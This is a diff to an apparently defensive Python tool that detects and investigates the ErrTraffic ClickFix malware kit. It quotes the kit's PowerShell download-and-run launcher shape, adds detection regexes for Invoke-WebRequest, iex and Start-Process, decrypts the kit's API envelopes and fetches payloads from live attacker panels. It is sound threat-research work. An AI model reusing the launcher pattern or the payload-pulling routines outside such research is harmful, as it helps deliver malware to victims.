@@ -772,6 +1135,50 @@ def classify_powershell_command(text: str) -> dict | None:
     return {"scheme": "powershell_command", "commands": cmds[:8]}
 
 
+def classify_bw_v2_launcher(text: str) -> dict | None:
+    """Recognize the ErrTraffic v3 (BW v2 generation) plaintext clipboard PS
+    launcher. Distinct from classify_aes_kit (which catches the AES-wrapped v3
+    original) — BW v2 dropped the clipboard-AES layer and ships a plain PS
+    that does:
+        Invoke-WebRequest -Uri 'https://<panel>/api/index.php?a=dl&uj=HEX&rlm=B64' -OutFile $X
+        Start-Process powershell -ArgumentList ... -File $X
+
+    Recognizing this shape lets us identify a v3-BWv2 hit directly from a
+    captured clipboard command, without needing any AES recovery step."""
+    # Strict marker: a /api/index.php?a=dl URL using the BW v2 `uj=` token alias.
+    m = re.search(
+        r'(https?://[^\s\'"`]+/api/index\.php\?[^\s\'"`]*?\ba=dl\b[^\s\'"`]*\buj=([0-9a-fA-F]{32,128})\b'
+        r'(?:[^\s\'"`]*\brlm=([A-Za-z0-9_\-]{1,32}))?[^\s\'"`]*)',
+        text)
+    if not m: return None
+    dl_url, token, rlm = m.group(1), m.group(2), m.group(3)
+    # Companion-signal: does this launcher actually invoke + run the .ps1 it fetches?
+    has_iwr        = bool(re.search(r'\bInvoke-WebRequest\b|\biwr\b', text, re.I))
+    has_start_proc = bool(re.search(r'\bStart-Process\b', text, re.I))
+    has_file_arg   = bool(re.search(r'-File\s*\$\w+|-File\s+["\'`][^"\'`]+["\'`]', text))
+    has_iex        = bool(re.search(r'\bInvoke-Expression\b|\biex\b', text, re.I))
+    confidence = 0.95 if (has_iwr and (has_start_proc or has_iex or has_file_arg)) else 0.85
+    return {
+        "scheme":               "bw_v2_launcher",
+        "dl_url":               dl_url,
+        "dl_url_defanged":      _defang(dl_url),
+        "token":                token,
+        "token_alias":          "uj",
+        "rlm":                  rlm,
+        "src_alias":            "rlm",
+        "has_invoke_webrequest": has_iwr,
+        "has_start_process":    has_start_proc,
+        "has_file_arg":         has_file_arg,
+        "has_invoke_expression": has_iex,
+        "confidence":           confidence,
+        "kit":                  "ErrTraffic v3 (BW v2 generation)",
+        "note":                 ("Plaintext (non-AES-wrapped) clipboard PowerShell launcher per the BW v2 "
+                                 "victim chain. Replaces the AES-CBC wrap used in the v3 original "
+                                 "generation. Re-run with --comprehensive --payload to attempt the "
+                                 "init→dl chain against the panel using the captured token."),
+    }
+
+
 def classify_tds_beacon(text: str) -> dict | None:
     hits = sorted({h for h in _TDS_RE.findall(text)})
     if not hits: return None
@@ -797,6 +1204,7 @@ def classify_antianalysis_gate(text: str) -> dict | None:
 
 
 CLASSIFIERS = [classify_etherhiding, classify_clipboard_payload, classify_aes_kit,
+               classify_bw_v2_launcher,
                classify_powershell_command, classify_tds_beacon, classify_antianalysis_gate]
 
 
@@ -1646,7 +2054,9 @@ def detect_cloudflare(html: str, headers: dict | None, ip_meta: dict | None = No
 # ============================================================================
 def parse_errtraffic_panel_url(url: str) -> dict | None:
     """Parse an ErrTraffic API URL into its constituent parts. Returns None if
-    URL doesn't look like one. Handles both v2 and v3 endpoint shapes."""
+    URL doesn't look like one. Handles v2, v3 (original), and v3 BW v2 generation
+    URL shapes — token, src, and mode params each have multiple known aliases.
+    """
     from urllib.parse import urlparse, parse_qs
     try:
         p = urlparse(url)
@@ -1658,30 +2068,50 @@ def parse_errtraffic_panel_url(url: str) -> dict | None:
     if version == "unknown":
         # not an ErrTraffic-shaped URL
         if not ("/api/" in path or "index.php" in path): return None
-    # canonicalize known query params
     qget = lambda k: (qs.get(k, [""])[0] or "").strip()
     action = qget("action") or qget("a")
+    # Token aliases — v3 original used `token`; BW v2 renamed to `uj`; some
+    # beacons use short-form `t`. Accept any; remember which alias we found.
+    token_val, token_alias = None, None
+    for alias in ERRTRAFFIC_KIT.get("bw_v2", {}).get("token_param_aliases", ["token","uj","t"]):
+        v = qget(alias)
+        if v: token_val, token_alias = v, alias; break
+    # Source/realm aliases — v3 original `src=` (clickfix/...); BW v2 may
+    # collapse to `rlm=` (4 bytes base64-url-safe of a per-deploy ID).
+    src_val, src_alias = None, None
+    for alias in ERRTRAFFIC_KIT.get("bw_v2", {}).get("src_param_aliases", ["src","rlm"]):
+        v = qget(alias)
+        if v: src_val, src_alias = v, alias; break
     info = {
         "version":  version,
         "host":     p.hostname,
         "host_defanged": _defang(p.hostname) if p.hostname else None,
         "path":     p.path,
         "action":   action,
-        "token":    qget("token") or None,
+        "token":    token_val,
+        "token_alias": token_alias,    # which param name carried the token
         "os":       qget("os") or None,
-        "src":      qget("src") or None,
+        "src":      src_val,
+        "src_alias": src_alias,
         "mode":     qget("mode") or None,
         "cb":       qget("cb") or None,
         "ref":      qget("ref") or None,
+        # BW v2: `q` carries the encrypted envelope on signed-outgoing-request URLs
+        "envelope_q": qget("q") or None,
     }
     # known role
-    if action in ("dl","download"):                   info["role"] = "payload_download"
-    elif action in ("cfg","settings"):                info["role"] = "config_fetch"
-    elif action == "evt":                             info["role"] = "telemetry"
-    elif action == "init":                            info["role"] = "session_init"
+    if action in ("dl","download"):                       info["role"] = "payload_download"
+    elif action in ("cfg","settings"):                    info["role"] = "config_fetch"
+    elif action == "evt":                                 info["role"] = "telemetry"
+    elif action == "init":                                info["role"] = "session_init"
     elif action in ("generateDownloadToken","gen-token"): info["role"] = "token_generation"
-    elif "css.js" in path:                            info["role"] = "obfuscated_loader"
-    else:                                              info["role"] = "unknown"
+    elif "css.js" in path:                                info["role"] = "obfuscated_loader"
+    elif info["envelope_q"]:                              info["role"] = "encrypted_envelope_request"
+    # ── v2 endpoints (where the action is in the path, not the query string)
+    elif "generate-download-token.php" in path:           info["role"] = "token_generation"
+    elif "download.php" in path:                          info["role"] = "payload_download"
+    elif "log.php" in path:                               info["role"] = "telemetry"
+    else:                                                 info["role"] = "unknown"
     return info
 
 
@@ -1996,6 +2426,287 @@ def aes_cbc_decrypt(key: bytes, iv: bytes, ct: bytes) -> bytes:
     if 1 <= padlen <= 16 and pt[-padlen:] == bytes([padlen]) * padlen:
         pt = pt[:-padlen]
     return pt
+
+
+# ============================================================================
+# AES-256-GCM for ErrTraffic v3 (BW v2 generation) API envelope (`enc:"gcm1"`)
+#   - Prefers pycryptodome / cryptography if installed
+#   - Falls back to a CORRECT pure-Python AES-GCM
+#   - Encryption block primitive (CTR keystream) built on top of the existing
+#     AES key-schedule (_aes_expand_key_flat) + table-driven GF(2^8) ops above
+# ============================================================================
+
+def _aes_shift_rows(s: list[int]):
+    """Forward ShiftRows — row i shifted left by i. Inverse of _aes_inv_shift_rows."""
+    s[1], s[5], s[9], s[13]   = s[5], s[9], s[13], s[1]
+    s[2], s[6], s[10], s[14]  = s[10], s[14], s[2], s[6]
+    s[3], s[7], s[11], s[15]  = s[15], s[3], s[7], s[11]
+
+
+def _aes_mix_columns(s: list[int]):
+    """Forward MixColumns — multiply each column by the fixed matrix in GF(2^8)."""
+    for c in range(4):
+        a = s[c*4]; b = s[c*4+1]; cc = s[c*4+2]; d = s[c*4+3]
+        s[c*4]   = _GMUL2[a] ^ _GMUL3[b] ^ cc ^ d
+        s[c*4+1] = a ^ _GMUL2[b] ^ _GMUL3[cc] ^ d
+        s[c*4+2] = a ^ b ^ _GMUL2[cc] ^ _GMUL3[d]
+        s[c*4+3] = _GMUL3[a] ^ b ^ cc ^ _GMUL2[d]
+
+
+def _aes_encrypt_block(block: bytes, rks: list[int]) -> bytes:
+    """Forward AES block encryption — needed for GCM (CTR mode keystream + GHASH H)."""
+    nr = (len(rks) // 16) - 1
+    s = list(block)
+    # Initial AddRoundKey
+    for i in range(16): s[i] ^= rks[i]
+    # nr-1 main rounds
+    for rnd in range(1, nr):
+        for i in range(16): s[i] = _AES_SBOX[s[i]]
+        _aes_shift_rows(s)
+        _aes_mix_columns(s)
+        rk_off = rnd * 16
+        for i in range(16): s[i] ^= rks[rk_off + i]
+    # Final round (no MixColumns)
+    for i in range(16): s[i] = _AES_SBOX[s[i]]
+    _aes_shift_rows(s)
+    rk_off = nr * 16
+    for i in range(16): s[i] ^= rks[rk_off + i]
+    return bytes(s)
+
+
+def _gf128_mul(x: int, y: int) -> int:
+    """Galois-field GF(2^128) multiplication, NIST SP 800-38D bit ordering
+    (most-significant bit first). Reduction polynomial: x^128 + x^7 + x^2 + x + 1.
+
+    Operands are 128-bit big-endian ints. Returns the 128-bit product as int.
+    Pure-Python; only invoked when no AES-GCM library is available, so speed is
+    not critical (envelope payloads are <1KB).
+    """
+    z = 0
+    v = y
+    # Iterate bits of x from MSB to LSB (NIST GCM convention).
+    for i in range(127, -1, -1):
+        if (x >> i) & 1:
+            z ^= v
+        # v = v >> 1 in GF, with reduction if LSB was set before shift
+        if v & 1:
+            v = (v >> 1) ^ 0xE1000000000000000000000000000000
+        else:
+            v >>= 1
+    return z
+
+
+def _ghash(h_int: int, data: bytes) -> int:
+    """Compute GHASH(H, data). `data` must already be the
+    GHASH input (AAD_padded || CT_padded || lenAAD_64 || lenCT_64)."""
+    y = 0
+    for i in range(0, len(data), 16):
+        block = data[i:i+16].ljust(16, b"\x00")
+        y ^= int.from_bytes(block, "big")
+        y = _gf128_mul(y, h_int)
+    return y
+
+
+def _aes_gcm_decrypt_pyfallback(key: bytes, iv: bytes, ct_with_tag: bytes,
+                                 aad: bytes = b"", tag_length: int = 16) -> bytes:
+    """Pure-Python AES-GCM decrypt + auth-verify. Raises on tag mismatch.
+
+    NIST SP 800-38D compliant. Used only when neither pycryptodome nor
+    cryptography is installed. Envelope payloads are small (<2KB typical),
+    so the O(n*128) pure-Python GHASH is acceptable.
+    """
+    if len(key) not in (16, 24, 32):
+        raise ValueError(f"AES-GCM key must be 16/24/32 bytes, got {len(key)}")
+    if tag_length not in (12, 13, 14, 15, 16):
+        raise ValueError(f"GCM tag length must be 12..16, got {tag_length}")
+    if len(ct_with_tag) < tag_length:
+        raise ValueError(f"GCM ciphertext shorter than tag length")
+    ct  = ct_with_tag[:-tag_length]
+    tag = ct_with_tag[-tag_length:]
+    rks = _aes_expand_key_flat(key)
+    # Hash subkey H = AES_E(K, 0^128)
+    h_block = _aes_encrypt_block(b"\x00" * 16, rks)
+    h_int   = int.from_bytes(h_block, "big")
+    # Initial counter J0
+    if len(iv) == 12:
+        j0 = iv + b"\x00\x00\x00\x01"
+    else:
+        # GHASH(H, IV || 0^s || 0^64 || lenIV_64)
+        pad = (-len(iv)) % 16
+        ghash_iv = iv + b"\x00" * pad + b"\x00" * 8 + (len(iv) * 8).to_bytes(8, "big")
+        j0_int  = _ghash(h_int, ghash_iv)
+        j0      = j0_int.to_bytes(16, "big")
+    # CTR-mode decrypt — counter starts at J0+1
+    pt = bytearray()
+    ctr_int = int.from_bytes(j0, "big")
+    for i in range(0, len(ct), 16):
+        ctr_int = ((ctr_int & ~((1 << 32) - 1)) |
+                   ((ctr_int + 1) & ((1 << 32) - 1)))
+        keystream = _aes_encrypt_block(ctr_int.to_bytes(16, "big"), rks)
+        block_ct  = ct[i:i+16]
+        pt.extend(a ^ b for a, b in zip(keystream[:len(block_ct)], block_ct))
+    # Auth: compute expected tag
+    aad_pad = (-len(aad)) % 16
+    ct_pad  = (-len(ct))  % 16
+    ghash_in = (aad + b"\x00" * aad_pad +
+                ct  + b"\x00" * ct_pad  +
+                (len(aad) * 8).to_bytes(8, "big") +
+                (len(ct)  * 8).to_bytes(8, "big"))
+    s_int    = _ghash(h_int, ghash_in)
+    e_j0     = _aes_encrypt_block(j0, rks)
+    expected = (s_int ^ int.from_bytes(e_j0, "big")).to_bytes(16, "big")[:tag_length]
+    # Constant-time compare
+    diff = 0
+    for x, y in zip(expected, tag): diff |= x ^ y
+    if diff != 0 or len(expected) != len(tag):
+        raise ValueError("AES-GCM authentication tag mismatch")
+    return bytes(pt)
+
+
+def aes_gcm_decrypt(key: bytes, iv: bytes, ct_with_tag: bytes,
+                    aad: bytes = b"", tag_length: int = 16) -> bytes:
+    """AES-128/192/256-GCM decrypt + auth-verify. Prefers pycryptodome /
+    cryptography if installed (much faster); falls back to vendored pure-Python.
+    Raises ValueError on tag mismatch (authenticated encryption guarantees)."""
+    if len(key) not in (16, 24, 32):
+        raise ValueError(f"AES-GCM key must be 16/24/32 bytes, got {len(key)}")
+    if len(iv) < 1:
+        raise ValueError("AES-GCM IV must be non-empty")
+    try:
+        from Crypto.Cipher import AES as _PCAes        # pycryptodome
+        ct  = ct_with_tag[:-tag_length]
+        tag = ct_with_tag[-tag_length:]
+        cipher = _PCAes.new(key, _PCAes.MODE_GCM, nonce=iv, mac_len=tag_length)
+        if aad: cipher.update(aad)
+        return cipher.decrypt_and_verify(ct, tag)
+    except ImportError: pass
+    except ValueError as e:
+        # tag mismatch from pycryptodome — re-raise with our message style
+        raise ValueError(f"AES-GCM authentication tag mismatch ({e})") from None
+    try:
+        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+        return AESGCM(key).decrypt(iv, ct_with_tag, aad if aad else None)
+    except ImportError: pass
+    except Exception as e:
+        raise ValueError(f"AES-GCM authentication tag mismatch ({e.__class__.__name__})") from None
+    return _aes_gcm_decrypt_pyfallback(key, iv, ct_with_tag, aad=aad, tag_length=tag_length)
+
+
+# ============================================================================
+# RC4 for ErrTraffic v3 legacy `q2` envelope mode
+#   - Trivial cipher; vendored directly (no library preference needed).
+# ============================================================================
+
+def rc4(key: bytes, data: bytes) -> bytes:
+    """RC4 stream cipher (encrypt == decrypt). 256-byte KSA + PRGA, no drop bytes
+    — matches the kit's loader-side rc4() exactly."""
+    if not key: raise ValueError("RC4 key must be non-empty")
+    s = list(range(256))
+    j = 0
+    for i in range(256):
+        j = (j + s[i] + key[i % len(key)]) & 0xff
+        s[i], s[j] = s[j], s[i]
+    out = bytearray(len(data))
+    i = j = 0
+    for k in range(len(data)):
+        i = (i + 1) & 0xff
+        j = (j + s[i]) & 0xff
+        s[i], s[j] = s[j], s[i]
+        out[k] = data[k] ^ s[(s[i] + s[j]) & 0xff]
+    return bytes(out)
+
+
+# ============================================================================
+# decrypt_api_envelope — Python port of the kit's loader-side decryptApiEnvelope.
+# ============================================================================
+# Mirrors the JS exactly:
+#   1. Reject non-objects / missing q field early.
+#   2. If enc == "gcm1": derive AES-256 key as sha256(API_Q2_KEY || scope+"|gcm1"),
+#      base64-url-decode q into [iv(12) || ct_with_tag(rest)], decrypt.
+#      On GCM failure, fall back to obj.q2 RC4 path if present (the JS does this).
+#   3. If enc == "q2": base64-url-decode q into [nonce(8) || ct], RC4 with
+#      key = base_key || nonce.
+#   4. JSON-parse the UTF-8 plaintext.
+#
+# `scope` is one of {"cfg","init","dl","evt"} and defaults to "cfg" per the JS.
+# Returns the parsed JSON object or raises ValueError on a hard decrypt failure.
+
+def _b64url_decode(s: str) -> bytes:
+    """Base64-url-safe decode with auto-padding. Matches the kit's b64urlToBytes."""
+    s = s.replace("-", "+").replace("_", "/")
+    return base64.b64decode(s + "=" * (-len(s) % 4), validate=False)
+
+
+def decrypt_api_envelope(obj: dict, *, scope: str = "cfg",
+                          base_key_hex: str | None = None) -> dict:
+    """Decrypt an ErrTraffic v3 (BW v2) API envelope.
+
+    Args:
+        obj:  the raw JSON response from /api/index.php?a=cfg|settings|init|dl
+        scope: the endpoint scope used in the key-derivation salt. Must match
+               /^[a-z0-9_]{1,16}$/i; the kit defaults to "cfg" if invalid.
+        base_key_hex: the API_Q2_KEY_HEX (64 hex chars = 32 bytes). When omitted,
+               uses the documented current key from `ERRTRAFFIC_KIT['bw_v2_keys']`
+               if populated, else raises ValueError.
+
+    Returns the parsed plaintext JSON, or raises ValueError on failure.
+
+    Implementation matches the kit's loader-side `decryptApiEnvelope()` exactly
+    (Polygon panel /api/css.js, BW v2 generation).
+    """
+    if not isinstance(obj, dict): raise ValueError("envelope must be a dict")
+    q = obj.get("q")
+    if not isinstance(q, str) or not q: raise ValueError("envelope missing 'q'")
+    # Resolve base key: explicit > kit table > error
+    if base_key_hex is None:
+        base_key_hex = (ERRTRAFFIC_KIT.get("bw_v2_keys") or {}).get("API_Q2_KEY_HEX")
+    if not base_key_hex:
+        raise ValueError("no API_Q2_KEY_HEX provided (and none in ERRTRAFFIC_KIT['bw_v2_keys'])")
+    if not re.fullmatch(r'[0-9a-fA-F]{64}', base_key_hex):
+        raise ValueError(f"API_Q2_KEY_HEX must be 64 hex chars (got {len(base_key_hex)})")
+    base_key = bytes.fromhex(base_key_hex)
+    # Validate scope per the kit's regex; fall through to default on bad input
+    if not re.fullmatch(r'[a-z0-9_]{1,16}', scope, re.I):
+        scope = "cfg"
+    enc = obj.get("enc")
+    last_err = None
+    if enc == "gcm1":
+        try:
+            packed = _b64url_decode(q)
+            if len(packed) < 12 + 16 + 1: raise ValueError("gcm1: packed too short")
+            iv  = packed[:12]
+            ct  = packed[12:]                                         # cipher || 16B tag
+            key = hashlib.sha256(base_key + (scope + "|gcm1").encode("utf-8")).digest()
+            plain = aes_gcm_decrypt(key, iv, ct, tag_length=16)
+            return json.loads(plain.decode("utf-8"))
+        except Exception as e:
+            last_err = e
+            # The kit's JS falls back to obj.q2 (RC4) when gcm1 fails — mirror it.
+            q2 = obj.get("q2")
+            if isinstance(q2, str) and q2:
+                try:
+                    p2     = _b64url_decode(q2)
+                    if len(p2) < 9: raise ValueError("q2 fallback: packed too short")
+                    nonce  = p2[:8]
+                    cipher = p2[8:]
+                    key_mat = base_key + nonce
+                    plain  = rc4(key_mat, cipher)
+                    return json.loads(plain.decode("utf-8"))
+                except Exception as e2:
+                    last_err = e2
+            raise ValueError(f"gcm1 decrypt failed: {last_err}")
+    if enc == "q2":
+        try:
+            packed = _b64url_decode(q)
+            if len(packed) < 9: raise ValueError("q2: packed too short")
+            nonce  = packed[:8]
+            cipher = packed[8:]
+            key_mat = base_key + nonce
+            plain  = rc4(key_mat, cipher)
+            return json.loads(plain.decode("utf-8"))
+        except Exception as e:
+            raise ValueError(f"q2 decrypt failed: {e}")
+    raise ValueError(f"unknown envelope enc={enc!r}")
 
 
 def try_recover_clipboard_aes(text: str) -> dict | None:
@@ -2434,11 +3145,57 @@ def fetch_panel_payload(panel_url: str, os_type: str, *,
             rec["error"] = ("init returned 200 but no 'token' field in JSON response "
                             f"(content-type {att['content_type']})")
 
+    # ─── Strategy 4: BW v2 generation /a=init→dl with uj=/rlm= param schema ────
+    # The BW v2 generation returns a simpler init shape:
+    #     {"token":"<64-char hex>"}           (no "ok" field, no AES wrap)
+    # The hex token is the dl token directly. Download URL schema also rotated:
+    #     /api/index.php?a=dl&uj=<hex>&rlm=<b64url-of-per-deploy-id>
+    # The `rlm` value binds the token to a specific lure-source / theme; if we
+    # don't have a captured one we try a small list of observed values + the
+    # default mode-encoded fallback. (Identifying the right rlm typically
+    # requires capturing it from the live victim chain via --payload-token
+    # /--payload-src; this strategy is the best-effort speculative path.)
+    bw_token = None
+    # Re-use the init response we already fetched in Strategy 3 (avoid double-fetch).
+    init_body = att if 'att' in locals() and isinstance(att, dict) else None
+    if init_body and init_body.get("status") == 200 and init_body.get("body_bytes"):
+        try:
+            j2 = json.loads(init_body["body_bytes"])
+        except Exception:
+            j2 = None
+        if isinstance(j2, dict):
+            cand = j2.get("token")
+            if isinstance(cand, str) and re.fullmatch(r'[0-9a-fA-F]{64}', cand or ""):
+                bw_token = cand
+    if bw_token:
+        out["token"]        = bw_token
+        out["token_source"] = "minted_via_v3_bwv2_init_plain_hex"
+        # Try observed rlm values, then a few defaults. Order:
+        #   1. caller-supplied --payload-src (interpreted as rlm here)
+        #   2. observed deployment values
+        #   3. mode-based encoded fallback
+        rlm_candidates = []
+        if src_param and src_param != "clickfix":
+            rlm_candidates.append(src_param)
+        rlm_candidates += ["AXV5gj"]                      # observed on slndcdnclaud.beer
+        # Fallback: base64-url of the mode_param (kit's mode codes appear bytes 1..3)
+        try:
+            rlm_fb = base64.urlsafe_b64encode(b"\x01" + mode_param.encode()[:3]).decode().rstrip("=")
+            rlm_candidates.append(rlm_fb)
+        except Exception: pass
+        for rlm in rlm_candidates:
+            dl_url = (f"{origin}/api/index.php?a=dl&uj={quote(bw_token, safe='')}"
+                      f"&rlm={quote(rlm, safe='')}")
+            if _try_download("v3_bwv2", "v3_bwv2_runtime", dl_url):
+                return _finalize_payload_save(out, p, os_type, out_dir)
+
     # All strategies exhausted
-    msg = ("all four endpoint strategies failed: "
+    msg = ("all five endpoint strategies failed: "
            "known-token /a=dl, v3-admin /index.php?action=, v2 /api/generate-download-token.php, "
-           "v3-runtime /a=init. Panel may be down, gated on a cookie/UA we don't simulate, "
-           "or the kit has been updated. See token_attempts for per-endpoint diagnostics.")
+           "v3-runtime /a=init→AES→dl, v3-bwv2 /a=init→dl?uj=. Panel may be down, gated on a "
+           "cookie/UA we don't simulate, the kit has been updated, or `rlm` requires a value "
+           "captured from a live victim chain (pass --payload-src <captured-rlm>). See "
+           "token_attempts for per-endpoint diagnostics.")
     out["errors"].append(msg)
     with _PAYLOAD_CACHE_LOCK:
         _PAYLOAD_CACHE[cache_key] = out
@@ -2596,6 +3353,104 @@ def detect_rotation_for_panel(panel_url: str, *, runs: int, timeout: int = 15,
                                    "Hash-based detection works against this kit version.")
     results["meta"] = meta
     return results
+
+
+def probe_panel_envelopes(panel_url: str, *, host: str | None = None,
+                           timeout: int = 15, verify_tls: bool = True,
+                           progress_fh=None) -> dict:
+    """Probe a BW v2 panel's /api/cfg and /api/settings endpoints, decrypt
+    the AES-GCM envelope, return the plaintext config dict the operator is
+    serving right now. Pure passive HTTP — no JS execution, no auth, no writes.
+
+    Returns:
+      {"probed": [str...],          # list of endpoint URLs hit
+       "responses": [{
+           "url": str, "status": int, "enc": "gcm1"|"q2"|None,
+           "q_bytes": int, "key_source": "host_specific"|"default"|None,
+           "decrypted": dict|None,   # plaintext JSON on success
+           "error": str|None,
+       }, ...],
+       "summary": {...}}            # mode / enabled / rentalExpired / etc. (flat)
+    """
+    out = {"probed": [], "responses": [], "summary": {}, "host": host}
+    from urllib.parse import urlparse
+    origin = f"{urlparse(panel_url).scheme or 'https'}://{urlparse(panel_url).netloc or host or ''}"
+    if not origin or origin == "https://":
+        out["error"] = "no panel origin"; return out
+    # Resolve per-host API_Q2_KEY_HEX if we have one captured for this fleet,
+    # else fall back to the documented kit-author default.
+    keys_cfg  = ERRTRAFFIC_KIT.get("bw_v2_keys", {}) or {}
+    host_lc   = (host or "").lower()
+    base_key  = (keys_cfg.get("by_host") or {}).get(host_lc) or keys_cfg.get("API_Q2_KEY_HEX")
+    key_src   = "host_specific" if (keys_cfg.get("by_host") or {}).get(host_lc) else \
+                ("default" if keys_cfg.get("API_Q2_KEY_HEX") else None)
+
+    runtime = ERRTRAFFIC_KIT.get("panel_endpoints_v3_runtime", {})
+    bw_v2   = ERRTRAFFIC_KIT.get("bw_v2", {})
+    scopes  = bw_v2.get("scopes", {}) or {}
+    # Endpoints to try (action_name, scope, url_suffix)
+    endpoints = [
+        ("cfg",      scopes.get("cfg",      "cfg"), runtime.get("cfg")),
+        ("settings", scopes.get("settings", "cfg"), runtime.get("settings")),
+    ]
+    hdrs = {"User-Agent": _BROWSER_UA,
+            "Accept":     "application/json, */*",
+            "Referer":    origin + "/",
+            "Origin":     origin}
+    if progress_fh:
+        print(f"[envelope-probe] base_key source: {key_src}", file=progress_fh)
+    for action_name, scope, suffix in endpoints:
+        if not suffix: continue
+        url = (f"{origin}{suffix}"
+               f"&os=windows&src={host_lc or ''}&mode=cloudflare"
+               if "?" in suffix
+               else f"{origin}{suffix}?os=windows&src={host_lc or ''}&mode=cloudflare")
+        out["probed"].append(url)
+        rec = {"url": url, "url_defanged": _defang(url), "action": action_name,
+               "scope": scope, "key_source": key_src,
+               "status": None, "enc": None, "q_bytes": 0,
+               "decrypted": None, "error": None}
+        try:
+            att = _http_get_safe(url, hdrs, timeout, max_bytes=131_072)
+            rec["status"]       = att["status"]
+            rec["content_type"] = att["content_type"]
+            rec["bytes"]        = att["bytes"]
+            if att["status"] != 200 or not att["body_bytes"]:
+                rec["error"] = f"non-200 / empty body ({att['status']}, {att['bytes']}B)"
+                out["responses"].append(rec); continue
+            try:
+                env = json.loads(att["body_bytes"])
+            except Exception as je:
+                rec["error"] = f"json parse failed: {je}"
+                out["responses"].append(rec); continue
+            rec["enc"]     = env.get("enc") if isinstance(env, dict) else None
+            rec["q_bytes"] = len(env.get("q","") or "") if isinstance(env, dict) else 0
+            if not base_key:
+                rec["error"] = ("no API_Q2_KEY_HEX available — cannot decrypt. "
+                                "Add the per-host key to ERRTRAFFIC_KIT['bw_v2_keys']['by_host'].")
+                out["responses"].append(rec); continue
+            try:
+                plain = decrypt_api_envelope(env, scope=scope, base_key_hex=base_key)
+                rec["decrypted"] = plain
+                if progress_fh:
+                    print(f"[envelope-probe] {action_name}: decrypted "
+                          f"({rec['enc']}, scope={scope})", file=progress_fh)
+            except Exception as de:
+                rec["error"] = f"decrypt failed: {de}"
+        except Exception as e:
+            rec["error"] = f"probe exception: {e.__class__.__name__}: {e}"
+        out["responses"].append(rec)
+    # Aggregate the most useful operator-visible fields into a flat summary
+    summary = {}
+    for r in out["responses"]:
+        d = r.get("decrypted") or {}
+        if isinstance(d, dict):
+            for k in ("mode","enabled","blockBots","rentalExpired","showDelay","os","browser",
+                      "panelBaseUrl","apiBase","logUrl","tokenUrl","downloadUrl"):
+                if k in d and k not in summary:
+                    summary[k] = d[k]
+    out["summary"] = summary
+    return out
 
 
 def download_all_os_payloads(panel_url: str, *, timeout: int = 15,
@@ -2776,6 +3631,13 @@ def investigate_ioc_comprehensive(url: str, args, progress_fh=None) -> dict:
         panel_host = _urlparse(target).hostname
         if panel_host:
             report["server_fingerprint"] = fingerprint_server(panel_host)
+        # Probe + decrypt BW v2 envelopes (/api/cfg, /api/settings). Yields the
+        # operator's live config in plaintext — mode (lure theme), enabled flag,
+        # blockBots, rentalExpired, etc. — without ever running JS or contacting
+        # the loader.
+        report["envelope_recovery"] = probe_panel_envelopes(
+            target, host=panel_host, timeout=args.fetch_timeout,
+            verify_tls=not args.no_tls_verify, progress_fh=progress_fh)
         # Cloudflare detection on panel — we DO have headers now (we just probed)
         # so use them. But also check what we'd see for a normal GET.
         try:
@@ -3244,7 +4106,7 @@ def _short_hash(s: str) -> str:
 
 def _group_verdict(classifications: list[dict]) -> str:
     schemes = {c["scheme"] for c in classifications}
-    if {"clipboard_payload", "aes_kit", "powershell_command"} & schemes: return "payload"
+    if {"clipboard_payload", "aes_kit", "powershell_command", "bw_v2_launcher"} & schemes: return "payload"
     if {"etherhiding", "tds_beacon"} & schemes: return "next_stage_loader"
     return "decoded" if classifications else "no_decode"
 
@@ -3302,6 +4164,35 @@ def analyze_html(label: str, html: str, source_meta: dict, *, max_depth: int = 8
             }
         decoded_groups[key]["block_indexes"].append(idx)
 
+    # Also run classifiers across ALL inline-script text (not just obfuscated
+    # blocks). Catches plaintext clipboard launchers, plaintext PowerShell, and
+    # TDS beacons that sit inside non-obfuscated <script> bodies — important
+    # for ErrTraffic v3 (BW v2 generation) which dropped the clipboard-AES
+    # wrap and ships a plaintext Invoke-WebRequest launcher.
+    plain_text = "\n".join(scripts)
+    if plain_text.strip():
+        plain_cls = classify(_html.unescape(plain_text))
+        # Only emit a synthetic "plaintext_scripts" group when classifiers
+        # actually found something (so we don't litter the report on every page).
+        if plain_cls:
+            # De-dupe against schemes already produced from obfuscated decode
+            existing_schemes = {c["scheme"] for g in decoded_groups.values()
+                                            for c in g["classifications"]}
+            novel = [c for c in plain_cls if c["scheme"] not in existing_schemes]
+            if novel:
+                key = _short_hash("plaintext::" + plain_text[:2000])
+                decoded_groups[key] = {
+                    "group_hash":      key,
+                    "block_indexes":   [],          # synthetic group, no specific block
+                    "decode_layers":   [{"scheme": "plaintext_scripts",
+                                          "info": f"classified {len(scripts)} inline <script> body(ies) "
+                                                  f"as plaintext (no obfuscation detected)"}],
+                    "classifications": novel,
+                    "iocs":            extract_loose_iocs(plain_text),
+                    "recovered_js":    plain_text,
+                    "recovered_js_path": None,
+                }
+
     if outdir:
         os.makedirs(outdir, exist_ok=True)
         safe = re.sub(r'[^A-Za-z0-9._-]', '_', label)[:60]
@@ -3339,7 +4230,7 @@ def analyze_html(label: str, html: str, source_meta: dict, *, max_depth: int = 8
             if r.get("ok") and r.get("decoded_url") and r["decoded_url"] not in resolved_seen:
                 resolved_seen.add(r["decoded_url"]); resolved_urls.append(r["decoded_url"])
 
-    if {"clipboard_payload", "aes_kit", "powershell_command"} & set(schemes_seen):
+    if {"clipboard_payload", "aes_kit", "powershell_command", "bw_v2_launcher"} & set(schemes_seen):
         verdict = "clipboard_or_powershell_payload"
     elif "etherhiding" in schemes_seen: verdict = "etherhiding_loader"
     elif "tds_beacon" in schemes_seen:  verdict = "tds_beacon_only"
@@ -3421,9 +4312,14 @@ def render_text(report: dict, fh=sys.stdout, *, quiet: bool = False):
     if not quiet:
         for g in report["groups"]:
             idxs = g["block_indexes"]
-            idxs_str = (f"#{idxs[0]}" if len(idxs) == 1
-                        else f"#{idxs[0]} (+{len(idxs)-1} clones: " +
-                             ", ".join(f"#{i}" for i in idxs[1:]) + ")")
+            if not idxs:
+                # Synthetic group (e.g. plaintext-scripts classifier pass).
+                idxs_str = "[plaintext]"
+            elif len(idxs) == 1:
+                idxs_str = f"#{idxs[0]}"
+            else:
+                idxs_str = (f"#{idxs[0]} (+{len(idxs)-1} clones: " +
+                            ", ".join(f"#{i}" for i in idxs[1:]) + ")")
             tag = {"payload":"[PAYLOAD]", "next_stage_loader":"[NEXT-STAGE LOADER]",
                    "decoded":"[decoded, inert]", "no_decode":"[no-decode]"}.get(
                        g["verdict"], f"[{g['verdict']}]")
@@ -3499,6 +4395,22 @@ def _render_cls_text(cls: dict, p):
